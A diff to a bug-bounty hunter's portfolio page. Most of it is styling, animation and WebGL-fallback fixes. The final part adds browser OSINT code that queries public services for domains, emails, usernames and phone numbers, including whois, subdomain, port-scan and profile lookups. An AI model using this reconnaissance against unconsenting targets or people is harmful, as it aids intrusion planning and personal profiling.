@@ -96,7 +96,15 @@ h2.sec-title:hover{text-shadow:2px 0 rgba(255,26,46,0.4),-2px 0 rgba(123,79,255,
 h2.sec-title .acc{color:var(--acc);text-shadow:0 0 24px rgba(255,26,46,0.35);}
 
 .reveal-wrap{overflow:hidden;}
-.reveal-inner{transform:translateY(70px);opacity:0;}
+.reveal-inner{
+  transform:translateY(0);
+  opacity:1;
+  transition:transform 0.8s ease, opacity 0.8s ease;
+}
+.gsap-ready .reveal-inner{
+  transform:translateY(60px);
+  opacity:0;
+}
 
 /* ABOUT */
 .about-layout{display:grid;grid-template-columns:1fr 1fr;gap:80px;align-items:start;}
@@ -1154,7 +1162,21 @@ h2.sec-title .reveal-inner span[style*="display:block"]{
 
 /* Título h2 dos líneas — garantizado */
 .tline1, .tline2{ display:block !important; line-height:0.92; }
-.sec-title .reveal-inner{ display:block !important; }
+/* Fix definitivo móvil — flexbox garantiza separación vertical */
+.sec-title .reveal-inner{
+  display:flex !important;
+  flex-direction:column !important;
+  align-items:flex-start !important;
+  width:100%;
+}
+/* Spans inline → bloque garantizado */
+.sec-title .reveal-inner > span,
+.sec-title .reveal-inner > span[style*="block"],
+h2 .reveal-inner > span {
+  display:block !important;
+  width:100%;
+  line-height:0.92;
+}
 
 
 /* ══ DRAGONES DE FONDO (MARCA DE AGUA NEÓN) ══ */
@@ -1222,30 +1244,200 @@ h2.sec-title .reveal-inner span[style*="display:block"]{
   transform:none !important;
 }
 
-</style>
 
-<script type="application/ld+json">
-{
-  "@context": "https://schema.org",
-  "@type": "Person",
-  "name": "Matías Ramírez Tudela",
-  "alternateName": "TudelaSec",
-  "url": "https://tudela.dev",
-  "jobTitle": "Ethical Hacker & Bug Bounty Hunter",
-  "worksFor": {
-    "@type": "Organization",
-    "name": "TudelaSec"
-  },
-  "sameAs": [
-    "https://hackerone.com/tudelasec",
-    "https://bugcrowd.com/tudelasec",
-    "https://bugbounty.intigriti.com/researcher/tudelasec",
-    "https://github.com/tudelasec",
-    "https://linkedin.com/in/tudelasec"
-  ]
+/* ══ VISIBLE SIN GSAP — todo se ve aunque fallen las animaciones ══ */
+#hero-tag, #hero-sub, #hero-ctas, #hero-scroll, #hero-bounty{
+  opacity:1 !important;
+  transform:none !important;
 }
-</script>
+.gsap-ready #hero-tag,
+.gsap-ready #hero-sub,
+.gsap-ready #hero-ctas,
+.gsap-ready #hero-scroll,
+.gsap-ready #hero-bounty{ opacity:0; transform:translateY(20px); }
 
+#hero-h1 .line span{ opacity:1 !important; transform:none !important; }
+.gsap-ready #hero-h1 .line span{ opacity:0; transform:translateY(110%); }
+
+.fr-reveal{ opacity:1 !important; transform:none !important; }
+.gsap-ready .fr-reveal{ opacity:0; transform:translateY(36px); }
+
+.stat-big{ opacity:1; }
+.hero-dragon{ opacity:1 !important; }
+#hero-bounty{ opacity:1 !important; }
+.threat-widget{ opacity:1 !important; }
+.pc{ opacity:1 !important; }
+
+
+/* ══ ARSENAL CARDS — siempre visibles ══ */
+.tool-card{
+  opacity:1 !important;
+  transform:none;
+  transition:transform 0.3s ease, box-shadow 0.3s ease;
+}
+.gsap-ready .tool-card{
+  opacity:1 !important; /* No ocultar, solo animar desde visible */
+}
+
+/* ══ FIX: h2 en mobile — todas las secciones ══ */
+@media(max-width:768px){
+  h2.sec-title {
+    overflow: visible !important;
+  }
+  h2.sec-title .reveal-inner {
+    display:flex !important;
+    flex-direction:column !important;
+    align-items:flex-start !important;
+    gap: 0 !important;
+  }
+  h2.sec-title .reveal-inner > * {
+    display:block !important;
+    width:100% !important;
+  }
+}
+
+/* ══ Particle color fix para WebGL ══ */
+#hero-canvas{ will-change: auto; }
+
+
+/* ══ PERFORMANCE EN MÓVIL ══ */
+@media(max-width:768px){
+  /* Reducir animaciones pesadas */
+  .sec-dragon-ambient{
+    animation-duration: 12s !important;
+    opacity: 0.07 !important;
+    filter: none !important; /* Quitar drop-shadow pesado en móvil */
+  }
+  /* Simplificar transiciones */
+  .tool-card, .vc, .finding-row, .wu-card {
+    transition: none !important;
+  }
+  /* Desactivar cursor personalizado en móvil (ya lo hacemos pero reforzar) */
+  .c-ring, .c-dot, .c-trail-wrap { display:none !important; }
+  /* Sin parallax en móvil */
+  .hero-dragon { transform: none !important; }
+  /* Reducir glow effects pesados */
+  .tool-icon { filter: none !important; }
+  .tool-icon svg { filter: drop-shadow(0 0 3px rgba(255,26,46,0.5)) !important; }
+}
+
+
+/* ══ HACKER TITLE ANIMATION — sin layout shift ══ */
+
+/* Scanline reveal: el texto aparece de izquierda a derecha */
+@keyframes scanReveal {
+  0%   { clip-path: inset(0 100% 0 0); opacity:1; }
+  100% { clip-path: inset(0 0% 0 0);   opacity:1; }
+}
+
+/* Glitch periódico: RGB split + flicker, CERO cambio de tamaño */
+@keyframes titleGlitch {
+  0%,92%,100%{ text-shadow:none; filter:none; }
+  93%{ text-shadow: 2px 0 rgba(255,26,46,0.9), -2px 0 rgba(0,255,163,0.5);
+       filter:brightness(1.1); }
+  94%{ text-shadow:-2px 0 rgba(255,26,46,0.9),  2px 0 rgba(0,200,255,0.5);
+       filter:brightness(0.9); }
+  95%{ text-shadow:none; filter:brightness(1.15); }
+  96%{ text-shadow: 3px 0 rgba(255,26,46,0.7), -1px 0 rgba(0,255,163,0.4);
+       filter:none; }
+  97%{ text-shadow:none; }
+  98%{ text-shadow:-2px 0 rgba(255,26,46,0.5); filter:brightness(1.05); }
+  99%{ text-shadow:none; filter:none; }
+}
+
+/* Cursor parpadeante en el primer span — efecto terminal */
+@keyframes cursorBlink {
+  0%,49%{ border-right-color: var(--acc); }
+  50%,100%{ border-right-color: transparent; }
+}
+
+/* Aplicar animaciones a todos los títulos de sección */
+.sec-title .tline1,
+.sec-title span[style*="display:block"]:first-child {
+  clip-path: inset(0 100% 0 0);
+  animation:
+    scanReveal 0.7s cubic-bezier(0.25,0.46,0.45,0.94) var(--scan-delay, 0.1s) forwards,
+    titleGlitch 6s ease-in-out calc(var(--scan-delay, 0.1s) + 0.8s) infinite;
+}
+
+.sec-title .tline2,
+.sec-title .acc[style*="display:block"],
+.sec-title span[style*="display:block"]:last-child {
+  clip-path: inset(0 100% 0 0);
+  animation:
+    scanReveal 0.65s cubic-bezier(0.25,0.46,0.45,0.94) calc(var(--scan-delay, 0.1s) + 0.18s) forwards,
+    titleGlitch 6s ease-in-out calc(var(--scan-delay, 0.1s) + 1.0s) infinite;
+}
+
+/* Delay aleatorio por sección */
+#sobre-mi   .sec-title { --scan-delay:0.2s; }
+#habilidades .sec-title { --scan-delay:0.2s; }
+#osint       .sec-title { --scan-delay:0.2s; }
+#cheatsheet  .sec-title { --scan-delay:0.2s; }
+#hallazgos   .sec-title { --scan-delay:0.2s; }
+#formacion   .sec-title { --scan-delay:0.2s; }
+#arsenal     .sec-title { --scan-delay:0.2s; }
+#conocimiento .sec-title{ --scan-delay:0.2s; }
+#servicios   .sec-title { --scan-delay:0.2s; }
+#warroom     .sec-title { --scan-delay:0.2s; }
+#hackertools .sec-title { --scan-delay:0.2s; }
+#contacto    .sec-title { --scan-delay:0.2s; }
+
+/* En móvil: misma animación pero sin glitch para performance */
+@media(max-width:768px){
+  .sec-title .tline1,
+  .sec-title .tline2,
+  .sec-title span[style*="display:block"] {
+    animation:
+      scanReveal 0.6s cubic-bezier(0.25,0.46,0.45,0.94) var(--scan-delay, 0.2s) forwards !important;
+  }
+}
+
+
+/* ══ WEBGL FALLBACK — CSS animated background ══ */
+#hero-canvas-fallback {
+  display: none;
+  position: absolute; inset: 0;
+  overflow: hidden;
+  z-index: 0;
+}
+#hero-canvas-fallback.active { display: block; }
+
+/* Grid de puntos animados — efecto particle field sin WebGL */
+#hero-canvas-fallback::before {
+  content:'';
+  position: absolute; inset: -20px;
+  background-image:
+    radial-gradient(circle, rgba(255,26,46,0.35) 1px, transparent 1px),
+    radial-gradient(circle, rgba(255,26,46,0.15) 1px, transparent 1px);
+  background-size: 48px 48px, 24px 24px;
+  background-position: 0 0, 12px 12px;
+  animation: gridDrift 20s linear infinite;
+}
+
+/* Pulso de glow central */
+#hero-canvas-fallback::after {
+  content:'';
+  position: absolute; inset: 0;
+  background:
+    radial-gradient(ellipse 60% 40% at 50% 50%, rgba(255,26,46,0.12) 0%, transparent 70%),
+    radial-gradient(ellipse 30% 60% at 70% 30%, rgba(255,26,46,0.06) 0%, transparent 60%);
+  animation: pulseFallback 4s ease-in-out infinite alternate;
+}
+
+@keyframes gridDrift {
+  0%   { transform: translateY(0) translateX(0); }
+  25%  { transform: translateY(-12px) translateX(6px); }
+  50%  { transform: translateY(-24px) translateX(-6px); }
+  75%  { transform: translateY(-12px) translateX(12px); }
+  100% { transform: translateY(0) translateX(0); }
+}
+@keyframes pulseFallback {
+  0%   { opacity: 0.6; transform: scale(1); }
+  100% { opacity: 1.0; transform: scale(1.05); }
+}
+
+</style>
 </head>
 <body>
 
@@ -1366,7 +1558,7 @@ h2.sec-title .reveal-inner span[style*="display:block"]{
       </g>
     </svg>
   </div>
-  <div class="pl-wordmark"><span>T</span><span>u</span><span>d</span><span>e</span><span>l</span><span>a</span><span class="acc">S</span><span class="acc">e</span><span class="acc">c</span></div>
+  <div class="pl-wordmark"><span>T</span><span>u</span><span>d</span><span>e</span><span>l</span><span>a</span><span class="acc" style="display:block;">S</span><span class="acc" style="display:block;">e</span><span class="acc" style="display:block;">c</span></div>
   <div class="pl-line"><div class="pl-fill" id="pl-fill"></div></div>
   <div class="pl-pct" id="pl-pct">0%</div>
 </div>
@@ -1394,6 +1586,7 @@ h2.sec-title .reveal-inner span[style*="display:block"]{
 
 <section class="hero" id="inicio">
   <canvas id="hero-canvas"></canvas>
+<div id="hero-canvas-fallback"></div>
   <div class="hero-dragon-wrap">
     <svg class="hero-dragon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1400 700" preserveAspectRatio="xMidYMid meet">
       <defs>
@@ -1528,7 +1721,7 @@ h2.sec-title .reveal-inner span[style*="display:block"]{
   </div>
   <div class="hero-bounty" id="hero-bounty">
     <span class="bc-label">Total en recompensas</span>
-    <span class="bc-amount" id="bc-amount">$0</span>
+    <span class="bc-amount" id="bc-amount">$16,800</span>
     <span class="bc-sub">11 reportes · 4 plataformas</span>
   </div>
   <div class="hero-scroll" id="hero-scroll">Scroll para explorar</div>
@@ -1541,9 +1734,9 @@ h2.sec-title .reveal-inner span[style*="display:block"]{
     <div class="about-layout">
       <div class="reveal-wrap"><div class="reveal-inner about-quote">Mi camino en el ethical hacking comenzó por la curiosidad de entender cómo funcionan los sistemas por dentro y el desafío de encontrar fallas donde otros ven seguridad. Lo que empezó como un interés autodidacta se transformó en una disciplina diaria buscando hallazgos críticos en plataformas internacionales. Hoy me dedico a proteger el ecosistema digital identificando vectores de ataque complejos antes de que puedan ser explotados.</div></div>
       <div class="stats-grid reveal-wrap"><div class="reveal-inner" style="display:contents;">
-        <div class="stat-item"><span class="stat-big" data-target="11">0</span><span class="stat-lbl">Divulgaciones verificadas</span></div>
-        <div class="stat-item"><span class="stat-big" data-target="3">0</span><span class="stat-lbl">Plataformas activas</span></div>
-        <div class="stat-item"><span class="stat-big" data-target="4">0</span><span class="stat-lbl">Hallazgos críticos</span></div>
+        <div class="stat-item"><span class="stat-big" data-target="11">11</span><span class="stat-lbl">Divulgaciones verificadas</span></div>
+        <div class="stat-item"><span class="stat-big" data-target="3">3</span><span class="stat-lbl">Plataformas activas</span></div>
+        <div class="stat-item"><span class="stat-big" data-target="4">4</span><span class="stat-lbl">Hallazgos críticos</span></div>
         <div class="stat-item"><span class="stat-big" data-prefix="$" data-target="16800" data-format="kd" data-suffix="+">$16.8K+</span><span class="stat-lbl">En recompensas</span></div>
       </div>
     </div>
@@ -1799,7 +1992,7 @@ h2.sec-title .reveal-inner span[style*="display:block"]{
 <section id="arsenal">
   <div class="wrap">
     <div class="sec-num reveal-wrap"><div class="reveal-inner">07 — Arsenal</div></div>
-    <h2 class="sec-title reveal-wrap"><div class="reveal-inner"><span class="tline1">Herramientas</span><span class="acc tline2">del hacker.</span></div></h2>
+    <h2 class="sec-title reveal-wrap"><div class="reveal-inner"><span style="display:block;" class="tline1">Herramientas</span><span class="acc tline2" style="display:block;">del hacker.</span></div></h2>
 
     <div class="tool-search-wrap reveal-wrap"><div class="reveal-inner" style="display:flex;align-items:center;gap:12px;width:100%;">
       <i class="fa-solid fa-magnifying-glass"></i>
@@ -1821,10 +2014,10 @@ h2.sec-title .reveal-inner span[style*="display:block"]{
     <h2 class="sec-title reveal-wrap"><div class="reveal-inner"><span style="display:block;">¿Sabías que</span><span class="acc" style="display:block;">existe esta vuln?</span></div></h2>
 
     <div class="kb-stats-row reveal-wrap"><div class="reveal-inner" style="display:flex;gap:24px;flex-wrap:wrap;">
-      <div class="kb-stat"><span class="kb-stat-num" id="kb-total">0</span><span class="kb-stat-lbl">Vulnerabilidades</span></div>
-      <div class="kb-stat"><span class="kb-stat-num" id="kb-crit-n">0</span><span class="kb-stat-lbl">Críticas</span></div>
-      <div class="kb-stat"><span class="kb-stat-num" id="kb-high-n">0</span><span class="kb-stat-lbl">Altas</span></div>
-      <div class="kb-stat"><span class="kb-stat-num" id="kb-cats-n">0</span><span class="kb-stat-lbl">Categorías</span></div>
+      <div class="kb-stat"><span class="kb-stat-num" id="kb-total">27</span><span class="kb-stat-lbl">Vulnerabilidades</span></div>
+      <div class="kb-stat"><span class="kb-stat-num" id="kb-crit-n">11</span><span class="kb-stat-lbl">Críticas</span></div>
+      <div class="kb-stat"><span class="kb-stat-num" id="kb-high-n">13</span><span class="kb-stat-lbl">Altas</span></div>
+      <div class="kb-stat"><span class="kb-stat-num" id="kb-cats-n">7</span><span class="kb-stat-lbl">Categorías</span></div>
     </div></div>
 
     <div class="kb-search-wrap reveal-wrap"><div class="reveal-inner" style="display:flex;gap:10px;width:100%;align-items:center;">
@@ -2010,7 +2203,7 @@ h2.sec-title .reveal-inner span[style*="display:block"]{
 <section id="hackertools">
   <div class="wrap">
     <div class="sec-num reveal-wrap"><div class="reveal-inner">15 — Toolkit</div></div>
-    <h2 class="sec-title reveal-wrap"><div class="reveal-inner"><span style="display:block;">Hacker</span><span class="acc">Tools.</span></div></h2>
+    <h2 class="sec-title reveal-wrap"><div class="reveal-inner"><span style="display:block;">Hacker</span><span class="acc" style="display:block;">Tools.</span></div></h2>
 
     <div class="htabs reveal-wrap"><div class="reveal-inner" style="display:flex;flex-wrap:wrap;gap:6px;">
       <button class="htab active" data-htab="encoder">Encoder / Decoder</button>
@@ -2121,7 +2314,7 @@ h2.sec-title .reveal-inner span[style*="display:block"]{
 <section id="warroom">
   <div class="wrap">
     <div class="sec-num reveal-wrap"><div class="reveal-inner">16 — Impacto Global</div></div>
-    <h2 class="sec-title reveal-wrap"><div class="reveal-inner"><span style="display:block;">War</span><span class="acc">Room.</span></div></h2>
+    <h2 class="sec-title reveal-wrap"><div class="reveal-inner"><span style="display:block;">War</span><span class="acc" style="display:block;">Room.</span></div></h2>
 
     <!-- THREAT MAP -->
     <div class="reveal-wrap"><div class="reveal-inner">
@@ -2419,17 +2612,24 @@ const reduce = window.matchMedia('(prefers-reduced-motion:reduce)').matches;
 
   let pct = 0;
   const iv = setInterval(() => {
-    pct = Math.min(100, pct + Math.random() * 4 + 1);
-    fill.style.width = pct + '%';
-    pctEl.textContent = Math.floor(pct) + '%';
+    // Más rápido en móvil para mejor experiencia
+  const speed = window.innerWidth < 768 ? (Math.random() * 8 + 3) : (Math.random() * 4 + 1);
+  pct = Math.min(100, pct + speed);
+    if(fill) fill.style.width = pct + '%';
+    if(pctEl) pctEl.textContent = Math.floor(pct) + '%';
     if(pct >= 100){
       clearInterval(iv);
       setTimeout(() => {
-        pl.classList.add('exit');
-        setTimeout(heroReveal, 500);
+        if(pl) pl.classList.add('exit');
+        if(document.body.classList.contains('gsap-ready')){
+          setTimeout(heroReveal, 500);
+        }
+        // Sin GSAP: el hero ya es visible por CSS, solo sacar el preloader
       }, 400);
     }
   }, 60);
+  // Failsafe: sacar preloader en max 5 segundos pase lo que pase
+  setTimeout(() => { if(pl) pl.classList.add('exit'); }, 5000);
 })();
 
 /* ══ HERO REVEAL ══ */
@@ -2477,13 +2677,31 @@ function heroReveal(){
   camera = new THREE.PerspectiveCamera(60, innerWidth/innerHeight, 0.1, 1000);
   camera.position.set(0, 0, 9);
   try {
-    renderer = new THREE.WebGLRenderer({ canvas, antialias:!isMobile, alpha:true });
+    // Verificar soporte WebGL antes de intentar
+    var testCanvas = document.createElement('canvas');
+    var testCtx = testCanvas.getContext('webgl2') || testCanvas.getContext('webgl') || testCanvas.getContext('experimental-webgl');
+    if(!testCtx){
+      throw new Error('WebGL not supported on this device');
+    }
+    renderer = new THREE.WebGLRenderer({
+      canvas,
+      antialias: false,
+      alpha: true,
+      powerPreference: 'low-power',
+      failIfMajorPerformanceCaveat: false,
+    });
   } catch(e) {
-    console.warn('WebGL not available:', e.message);
+    // WebGL no disponible — activar fallback CSS
     if(canvas) canvas.style.display='none';
+    var fallback = document.getElementById('hero-canvas-fallback');
+    if(fallback) fallback.classList.add('active');
     return; // legal dentro de la IIFE
   }
-  if(!renderer) return; // doble check
+  if(!renderer){
+    var fallback2 = document.getElementById('hero-canvas-fallback');
+    if(fallback2) fallback2.classList.add('active');
+    return; // doble check
+  }
   renderer.setSize(innerWidth, innerHeight);
   renderer.setPixelRatio(Math.min(devicePixelRatio, 2));
   renderer.setClearColor(0x000000, 0);
@@ -2568,7 +2786,7 @@ function heroReveal(){
     colArr[i*3+2]= 1.0;
   }
   pGeo.setAttribute('position', new THREE.BufferAttribute(posArr,3));
-  pGeo.setAttribute('color',    new THREE.BufferAttribute(colArr,3));
+  pGeo.setAttribute('aColor',    new THREE.BufferAttribute(colArr,3));
   pGeo.setAttribute('aSize',    new THREE.BufferAttribute(sizeArr,1));
 
   const pMat = new THREE.ShaderMaterial({
@@ -2578,11 +2796,11 @@ function heroReveal(){
     },
     vertexShader:`
       attribute float aSize;
-      attribute vec3 color;
+      attribute vec3 aColor;
       varying vec3 vCol;
       uniform float uPulse;
       void main(){
-        vCol=color;
+        vCol=aColor;
         vec4 mv=modelViewMatrix*vec4(position,1.0);
         gl_PointSize=aSize*(300.0/-mv.z)*(1.0+uPulse*0.55);
         gl_Position=projectionMatrix*mv;
@@ -2608,7 +2826,7 @@ function heroReveal(){
   const lPos  = new Float32Array(MAX_LINES*6);
   const lCol  = new Float32Array(MAX_LINES*6);
   lGeo.setAttribute('position', new THREE.BufferAttribute(lPos,3));
-  lGeo.setAttribute('color',    new THREE.BufferAttribute(lCol,3));
+  lGeo.setAttribute('aColor',    new THREE.BufferAttribute(lCol,3));
   lGeo.setDrawRange(0,0);
   const lMat = new THREE.LineBasicMaterial({
     transparent:true, opacity:0.28,
@@ -3117,16 +3335,12 @@ const dorkTemplates = {
 };
 
 /* Live API calls per type */
-
-// === TUDELASEC RENDER BACKEND PROXY ===
-const RENDER_API = 'https://tudelasec-github-io.onrender.com';
-
 const liveApis = {
   domain:[
     { id:'crt',   label:'crt.sh — Subdominios desde certs', fn: async (q) => {
       const r = await fetch('https://crt.sh/?q=%25.' + encodeURIComponent(q) + '&output=json');
       const data = await r.json();
-      const uniq = [...new Set(data.flatMap(e => e.name_value.split(/[\r\n]+/))
+      const uniq = [...new Set(data.flatMap(e => e.name_value.split("\n"))
         .map(s => s.trim().replace(/^\*\./,'').toLowerCase())
         .filter(s => s.includes('.') && s.endsWith(q))
       )].sort();
@@ -3136,7 +3350,7 @@ const liveApis = {
       const r = await fetch('https://api.hackertarget.com/hostsearch/?q=' + encodeURIComponent(q));
       const txt = await r.text();
       if(txt.includes('error') || txt.includes('API count')) throw new Error('Límite de API alcanzado');
-      const lines = txt.trim().split(/[\r\n]+/).filter(l => l.trim());
+      const lines = txt.trim().split("\n").filter(l => l.trim());
       const hosts = lines.map(l => l.split(',')[0]).filter(Boolean);
       return { type:'tags', label: hosts.length + ' hosts via Shodan', items: hosts.slice(0,40) };
     }},
@@ -3144,19 +3358,19 @@ const liveApis = {
       const r = await fetch('https://api.hackertarget.com/dnslookup/?q=' + encodeURIComponent(q));
       const txt = await r.text();
       if(txt.includes('error') || txt.includes('API count')) throw new Error('Límite de API alcanzado');
-      return { type:'list', items: txt.trim().split(/[\r\n]+/).filter(l => l.trim()).slice(0,14) };
+      return { type:'list', items: txt.trim().split("\n").filter(l => l.trim()).slice(0,14) };
     }},
     { id:'headers', label:'HackerTarget — HTTP Headers (fingerprint)', fn: async (q) => {
       const r = await fetch('https://api.hackertarget.com/httpheaders/?q=https://' + encodeURIComponent(q));
       const txt = await r.text();
       if(txt.includes('error') || txt.includes('API count')) throw new Error('Límite de API alcanzado');
-      return { type:'list', items: txt.trim().split(/[\r\n]+/).filter(l => l.trim()).slice(0,16) };
+      return { type:'list', items: txt.trim().split("\n").filter(l => l.trim()).slice(0,16) };
     }},
     { id:'whois', label:'HackerTarget — Whois', fn: async (q) => {
       const r = await fetch('https://api.hackertarget.com/whois/?q=' + encodeURIComponent(q));
       const txt = await r.text();
       if(txt.includes('error') || txt.includes('API count')) throw new Error('Límite de API alcanzado');
-      const lines = txt.trim().split(/[\r\n]+/).filter(l => l.trim() && !l.startsWith('%') && !l.startsWith('#')).slice(0,14);
+      const lines = txt.trim().split("\n").filter(l => l.trim() && !l.startsWith('%') && !l.startsWith('#')).slice(0,14);
       return { type:'list', items: lines };
     }},
     { id:'wayback', label:'Wayback Machine — Snapshots archivados', fn: async (q) => {
@@ -3202,14 +3416,14 @@ const liveApis = {
       const r = await fetch('https://api.hackertarget.com/reverseiplookup/?q=' + encodeURIComponent(q));
       const txt = await r.text();
       if(txt.includes('error') || txt.includes('No DNS') || txt.includes('API count')) throw new Error(txt.trim().substring(0,60));
-      const lines = txt.trim().split(/[\r\n]+/).filter(l => l.trim());
+      const lines = txt.trim().split("\n").filter(l => l.trim());
       return { type:'tags', label: lines.length + ' dominios en esta IP', items: lines.slice(0,30) };
     }},
     { id:'nmap', label:'HackerTarget — Puertos abiertos (Nmap)', fn: async (q) => {
       const r = await fetch('https://api.hackertarget.com/nmap/?q=' + encodeURIComponent(q));
       const txt = await r.text();
       if(txt.includes('error') || txt.includes('API count')) throw new Error('Límite de API alcanzado');
-      const lines = txt.trim().split(/[\r\n]+/).filter(l => l.includes('open'));
+      const lines = txt.trim().split("\n").filter(l => l.includes('open'));
       return { type:'list', items: lines.length ? lines : ['Sin puertos abiertos detectados'] };
     }},
     { id:'otx_ip', label:'AlienVault OTX — Threat Intelligence', fn: async (q) => {
@@ -3266,6 +3480,223 @@ const liveApis = {
         'Reputación: ' + (d.reputation || 0),
         'Indicadores relacionados: ' + ((d.pulse_info && d.pulse_info.references) ? d.pulse_info.references.length : 0),
       ]};
+    }},
+  ],
+
+  email:[
+    { id:'emailrep', label:'EmailRep.io — Reputación y perfil', fn: async function(q) {
+      const r = await fetch('https://emailrep.io/' + encodeURIComponent(q), { headers:{'Accept':'application/json'} });
+      if(!r.ok) throw new Error('EmailRep error: ' + r.status);
+      const d = await r.json();
+      const det = d.details || {};
+      return { type:'list', items: [
+        'Reputación: ' + (d.reputation||'—') + (d.suspicious ? ' ⚠ SOSPECHOSO' : ' ✓ OK'),
+        'Blacklisted: ' + (det.blacklisted ? '⚠ Sí' : '✓ No'),
+        'Email gratuito: ' + (det.free_provider ? 'Sí (Gmail/Yahoo/etc)' : 'No'),
+        'Spoofable: ' + (det.spoofable ? '⚠ Sin SPF/DMARC' : '✓ Protegido'),
+        'Antigüedad dominio: ' + (det.days_since_domain_creation ? det.days_since_domain_creation + ' días' : '—'),
+        'Referencias: ' + (d.references||0),
+        'Perfiles: ' + (det.profiles && det.profiles.length ? det.profiles.join(', ') : 'Ninguno detectado'),
+      ] };
+    }},
+    { id:'email_whois', label:'HackerTarget — WHOIS del dominio', fn: async function(q) {
+      const domain = q.split('@')[1];
+      if(!domain) throw new Error('Usa formato user@dominio.com');
+      const r = await fetch('https://api.hackertarget.com/whois/?q=' + encodeURIComponent(domain));
+      const txt = await r.text();
+      if(txt.includes('error') || txt.includes('API count')) throw new Error('Límite de API');
+      const lines = txt.trim().split("\n").filter(function(l){ return l.trim() && !l.startsWith("%") && !l.startsWith("#"); }).slice(0,12);
+      return { type:'list', items: ['@' + domain, ...lines] };
+    }},
+    { id:'email_dns',   label:'HackerTarget — Registros DNS del dominio', fn: async function(q) {
+      const domain = q.split('@')[1];
+      if(!domain) throw new Error('Usa formato user@dominio.com');
+      const r = await fetch('https://api.hackertarget.com/dnslookup/?q=' + encodeURIComponent(domain));
+      const txt = await r.text();
+      if(txt.includes('error') || txt.includes('API count')) throw new Error('Límite de API');
+      return { type:'list', items: txt.trim().split("\n").filter(function(l){ return l.trim(); }).slice(0,14) };
+    }},
+    { id:'email_otx', label:'AlienVault OTX — Email en threat feeds', fn: async function(q) {
+      const r = await fetch('https://otx.alienvault.com/api/v1/indicators/email/' + encodeURIComponent(q) + '/general');
+      const d = await r.json();
+      const pulses = (d.pulse_info && d.pulse_info.count) || 0;
+      return { type:'list', items: [
+        'Pulsos OTX: ' + pulses + (pulses > 0 ? ' ⚠ EN THREAT FEEDS' : ' ✓ Limpio'),
+        'Reputación: ' + (d.reputation||0),
+      ] };
+    }},
+  ],
+
+  username:[
+    { id:'gh', label:'GitHub — Perfil público del hacker', fn: async function(q) {
+      const u = q.replace(/^@/,'');
+      const r = await fetch('https://api.github.com/users/' + encodeURIComponent(u));
+      if(r.status === 404) throw new Error('No existe en GitHub');
+      const d = await r.json();
+      return { type:'list', items: [
+        '✓ github.com/' + d.login,
+        'Nombre: ' + (d.name||'—'),
+        'Bio: ' + (d.bio||'—'),
+        'Empresa: ' + (d.company||'—'),
+        'Ubicación: ' + (d.location||'—'),
+        'Email público: ' + (d.email||'—'),
+        'Repos públicos: ' + d.public_repos,
+        'Seguidores: ' + d.followers,
+        'Twitter: ' + (d.twitter_username ? '@'+d.twitter_username : '—'),
+        'Blog: ' + (d.blog||'—'),
+        'Cuenta creada: ' + new Date(d.created_at).toLocaleDateString('es-CL'),
+      ] };
+    }},
+    { id:'keybase', label:'Keybase — Identidades criptográficas verificadas', fn: async function(q) {
+      const u = q.replace(/^@/,'');
+      const r = await fetch('https://keybase.io/_/api/1.0/user/lookup.json?username=' + encodeURIComponent(u));
+      const d = await r.json();
+      if(!d.them) throw new Error('No existe en Keybase');
+      const them = d.them;
+      const proofs = (them.proofs_summary && them.proofs_summary.all) || [];
+      const items = [
+        '✓ keybase.io/' + them.basics.username,
+        'Nombre: ' + (them.profile && them.profile.full_name || '—'),
+        'Clave PGP: ' + (them.public_keys && them.public_keys.primary ? '✓ ' + them.public_keys.primary.key_fingerprint.toUpperCase() : 'Sin clave'),
+      ];
+      proofs.slice(0,6).forEach(function(p){
+        items.push('✓ ' + p.proof_type + ': ' + (p.nametag || p.human_url || '—'));
+      });
+      if(!proofs.length) items.push('Sin pruebas de identidad');
+      return { type:'list', items: items };
+    }},
+    { id:'wayback_user', label:'Wayback Machine — Menciones históricas', fn: async function(q) {
+      const u = q.replace(/^@/,'');
+      const r = await fetch('https://archive.org/wayback/available?url=github.com/' + encodeURIComponent(u));
+      const d = await r.json();
+      const snap = d.archived_snapshots && d.archived_snapshots.closest;
+      const items = [
+        '✓ Búsqueda: @' + u,
+        'GitHub: https://github.com/' + u,
+        'HackerOne: https://hackerone.com/' + u,
+        'Bugcrowd: https://bugcrowd.com/' + u,
+        'Twitter/X: https://x.com/' + u,
+        'Reddit: https://reddit.com/u/' + u,
+        'Keybase: https://keybase.io/' + u,
+      ];
+      if(snap && snap.available) items.push('Wayback GitHub: ' + snap.url);
+      return { type:'list', items: items };
+    }},
+  ],
+
+  phone:[
+    { id:'phone_validate', label:'Validación — Formato E.164 y prefijo de país', fn: async function(q) {
+      const clean = q.replace(/[\s\-\.\(\)]/g,'');
+      const digits = clean.replace(/^\+/,'');
+      if(!/^\d{6,15}$/.test(digits)) throw new Error('Formato inválido. Usa +56912345678');
+      const prefixes = {
+        '56':'Chile','1':'USA/Canadá','54':'Argentina','55':'Brasil','51':'Perú',
+        '57':'Colombia','598':'Uruguay','595':'Paraguay','591':'Bolivia',
+        '52':'México','34':'España','44':'UK','49':'Alemania','33':'Francia',
+        '7':'Rusia','86':'China','91':'India','61':'Australia','81':'Japón',
+        '82':'Corea','39':'Italia','351':'Portugal',
+      };
+      let country = '—';
+      for(let len of [3,2,1]){ const p=digits.slice(0,len); if(prefixes[p]){ country=prefixes[p]; break; } }
+      let lineType = '—';
+      if(country==='Chile'){
+        const local = digits.slice(2);
+        if(local[0]==='9') lineType='Móvil';
+        else if(local.startsWith('22')) lineType='Fijo RM';
+        else lineType='Fijo regional';
+      }
+      return { type:'list', items: [
+        'Número: ' + (clean.startsWith('+')?clean:'+'+digits),
+        'País: ' + country,
+        'Tipo de línea: ' + lineType,
+        'Dígitos: ' + digits.length,
+        'Formato E.164: +' + digits,
+        'Dork: "' + clean + '" OR "' + '+' + digits + '"',
+      ] };
+    }},
+    { id:'phone_otx', label:'AlienVault OTX — Número en threat feeds', fn: async function(q) {
+      const clean = q.replace(/[\s\-\.\(\)]/g,'').replace(/^\+/,'');
+      const r = await fetch('https://otx.alienvault.com/api/v1/search/pulses?q=' + encodeURIComponent(clean) + '&limit=5');
+      const d = await r.json();
+      const results = d.results || [];
+      if(!results.length) return { type:'list', items: ['✓ Sin menciones en OTX para +' + clean] };
+      const items = ['⚠ ' + results.length + ' pulsos relacionados'];
+      results.forEach(function(p){ items.push('• ' + p.name); });
+      return { type:'list', items: items };
+    }},
+  ],
+
+  empresa:[
+    { id:'clearbit', label:'Clearbit — Info pública (logo, dominio, redes)', fn: async function(q) {
